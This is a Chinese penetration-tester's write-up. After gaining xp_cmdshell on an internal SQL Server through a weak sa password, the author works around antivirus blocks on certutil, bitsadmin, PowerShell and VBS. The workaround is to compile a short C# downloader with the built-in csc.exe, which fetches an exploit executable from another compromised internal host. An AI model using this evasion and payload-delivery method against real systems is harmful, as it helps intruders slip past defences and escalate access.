前言

在一次项目中，获得外网一台linux机器，非root权限，提不了权。把流量带出来之后扫描到内网一台机器的sa弱口令，可以执行xp_cmdshell。通过查看补丁发现可以通过exp提权，正当我以为权限到手的时候，却发现一个问题，exp无法传到目标机器上面。因此，就有了本文的艰难的文件上传之路。


目标系统

Windows 2016

SQLServer 2012，以mssqlserver权限启动

目标不通外网、无web，只开放了3389和1433端口


思路

已经获得的机器上面有web，在目标上面可以通过内网IP访问，尝试用命令行方式下载exp到目标机器。


过程

目标系统为2016

权限为mssqlserver

C:\temp目录可写

尝试用certutil下载文件，被AV拦了

bitsadmin，同样被拦

Powershell变形免杀还是失败

到这里我已经有点沉不住气了，看来这个没有我想象的那么简单
尝试一下用certutil编码文件

用echo把s.txt的内容输出到一个文件里

尝试还原文件，依然失败

echo一个vbs，还没写进去就拒绝访问了

混淆免杀了一下vbs后发现，cscript根本无法执行

wscript也是一样

到这里我几乎已经没有办法了，但是在翻找电脑里面的资料时，忽然发现一个好东西，就是Windows .NET自带的一个编译器：C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe

csc.exe是微软.NET Framework中的C#编译器，Windows系统中默认包含，可在命令行下将cs文件编译成exe
这个东西的路径视.NET安装的目录而定

先尝试启动一下看是否存在

目标是存在的，编写一个下载文件的程序
using System.Net;
namespace downloader
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string URLAddress = @"http://192.168.74.225/s.exe";
            string receivePath = @"c:\temp\s.exe";
            client.DownloadFile(URLAddress, receivePath);
        }
    }
}
echo进去

用csc进行编译，没有被拦

执行看一下

可以看到s.exe已经成功下载回来了

到此，我们艰难的文件上传之旅就完美结束了。
